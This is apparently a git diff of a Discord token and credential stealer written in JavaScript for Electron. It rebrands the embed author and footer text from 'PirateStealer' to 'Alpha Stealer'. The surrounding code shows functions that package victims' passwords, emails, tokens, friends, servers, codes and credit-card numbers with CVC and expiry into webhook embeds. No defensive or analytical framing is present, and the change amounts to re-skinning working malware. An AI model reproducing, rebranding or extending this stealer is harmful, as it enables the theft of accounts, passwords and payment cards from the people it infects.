@@ -1,4 +1,3 @@
-// else aint working idk why
 const {
     BrowserWindow,
     session
@@ -237,10 +236,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "PirateStealer"
+                            name: "Alpha Stealer"
                         },
                         footer: {
-                            text: "PirateStealer"
+                            text: "Alpha Stealer"
                         },
                         thumbnail: {
                             url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -354,10 +353,10 @@ async function userLogin(password, email, token) {
                 inline: !1
             },],
             "author": {
-                "name": "PirateStealer"
+                "name": "Alpha Stealer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Alpha Stealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -367,10 +366,10 @@ async function userLogin(password, email, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "PirateStealer"
+                "name": "Alpha Stealer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Alpha Stealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -381,10 +380,10 @@ async function userLogin(password, email, token) {
             "color": config['embed-color'],
             "description": servers.message,
             "author": {
-                "name": "PirateStealer"
+                "name": "Alpha Stealer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Alpha Stealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -400,10 +399,10 @@ async function userLogin(password, email, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "PirateStealer"
+                "name": "Alpha Stealer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Alpha Stealer"
             }
         }
         params.embeds.push(embed)
@@ -459,10 +458,10 @@ async function emailChanged(password, newEmail, token) {
                 inline: !1
             },],
             "author": {
-                "name": "PirateStealer"
+                "name": "Alpha Stealer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Alpha Stealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -472,10 +471,10 @@ async function emailChanged(password, newEmail, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "PirateStealer"
+                "name": "Alpha Stealer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Alpha Stealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -490,10 +489,10 @@ async function emailChanged(password, newEmail, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "PirateStealer"
+                "name": "Alpha Stealer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Alpha Stealer"
             }
         }
         params.embeds.push(embed)
@@ -556,10 +555,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
                 inline: !1
             },],
             "author": {
-                "name": "PirateStealer"
+                "name": "Alpha Stealer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Alpha Stealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -569,10 +568,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "PirateStealer"
+                "name": "Alpha Stealer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Alpha Stealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -582,10 +581,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
             "color": config['embed-color'],
             "description": servers.message,
             "author": {
-                "name": "PirateStealer"
+                "name": "Alpha Stealer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Alpha Stealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -602,10 +601,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "PirateStealer"
+                "name": "Alpha Stealer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Alpha Stealer"
             }
         }
         params.embeds.push(embed)
@@ -673,10 +672,10 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
             },
             ],
             "author": {
-                "name": "PirateStealer"
+                "name": "Alpha Stealer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Alpha Stealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -686,10 +685,10 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "PirateStealer"
+                "name": "Alpha Stealer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Alpha Stealer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
